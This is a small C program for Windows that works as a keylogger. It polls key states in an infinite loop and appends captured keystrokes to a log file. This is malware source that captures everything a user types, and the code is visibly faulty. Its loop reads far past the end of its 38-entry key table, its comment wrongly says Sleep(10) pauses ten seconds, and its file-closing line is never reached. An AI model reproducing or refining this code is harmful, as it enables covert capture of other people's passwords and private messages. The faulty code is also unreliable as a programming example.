#include <windows.h>
#include <winuser.h>
#include <stdio.h>

FILE *fptr;

struct KeyMapping{ //Making a struct for storing virtualkeys and charecters
    int virtualkeyCode;
    char characters;
};

struct KeyMapping key_map[] = {
    {0x0D, '\n'},
    {0x20, ' '},
    {0x30, '0'},
    {0x31, '1'},
    {0x32, '2'},
    {0x33, '3'},
    {0x34, '4'},
    {0x35, '5'},    
    {0x36, '6'},
    {0x37, '7'},
    {0x38, '8'},
    {0x39, '9'},
    {0x41, 'A'},
    {0x42, 'B'},
    {0x43, 'C'},
    {0x44, 'D'},
    {0x45, 'E'},
    {0x46, 'F'},
    {0x47, 'G'},
    {0x48, 'H'},
    {0x49, 'I'},
    {0x4A, 'J'},
    {0x4B, 'K'},
    {0x4C, 'L'},
    {0x4D, 'M'},
    {0x4E, 'N'},
    {0x4F, 'O'},
    {0x50, 'P'},
    {0x51, 'Q'},
    {0x52, 'R'},
    {0x53, 'S'},
    {0x54, 'T'},
    {0x55, 'U'},
    {0x56, 'V'},
    {0x57, 'W'},
    {0x58, 'X'},
    {0x59, 'Y'},
    {0x5A, 'Z'}
};

int main(){
    fptr = fopen("log.txt", "a"); //creating .txt file for storing keystrokes
    while(1){   //initializing infinite while loop
        for(int i = 0x01; i <= 0xFE; i++){ 
            if (GetAsyncKeyState(key_map[i].virtualkeyCode) & 0x0001){ //watching if key is pressed 
            fprintf(fptr, "%c", key_map[i].characters); //printing key press in .txt file
            fflush(fptr);
        }
        }

        Sleep(10); //program stops for 10 seconds

    }
    fclose(fptr); //.txt file is closing



    return 0;
}